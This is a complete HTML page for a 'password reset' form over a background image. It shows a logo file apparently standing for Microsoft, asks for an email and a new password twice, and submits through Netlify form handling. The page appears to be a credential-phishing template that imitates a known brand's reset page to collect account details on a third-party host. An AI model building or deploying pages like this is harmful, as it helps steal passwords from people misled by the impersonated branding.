<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Responsive Form with Background</title>
    <style>
        /* Basic reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            font-family: Arial, sans-serif;
        }

        /* Background image */
        .background {
            background-image: url('https://via.placeholder.com/1500x1000'); /* Replace with your background image */
            background-size: cover;
            background-position: center;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Form styling */
        .form-container {
            background: rgba(255, 255, 255, 0.8); /* Semi-transparent background */
            padding: 20px;
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
        }

        .form-container img {
            max-width: 150px; /* Logo size */
            margin-bottom: 20px;
        }

        .form-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        /* Button styling */
        .form-container button {
            padding: 12px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        .form-container button:hover {
            background-color: #0056b3;
        }

        /* Responsive design */
        @media (max-width: 600px) {
            .form-container {
                padding: 15px;
            }

            .form-container input,
            .form-container button {
                font-size: 14px;
                padding: 8px;
            }
        }
    </style>
</head>
<body>

    <div class="background">
        <div class="form-container">
            <img src="MS_Logo.png" alt="Logo"> <!-- Replace with your logo -->
            <form name="passwordReset" method="POST" data-netlify="true">
               <input type="email" placeholder="Your email" required>
               <input type="password" placeholder="New password" required>
               <input type="password" placeholder="Reenter password" required>
                <button type="submit">Next</button>
            </form>
        </div>
    </div>

</body>
</html>
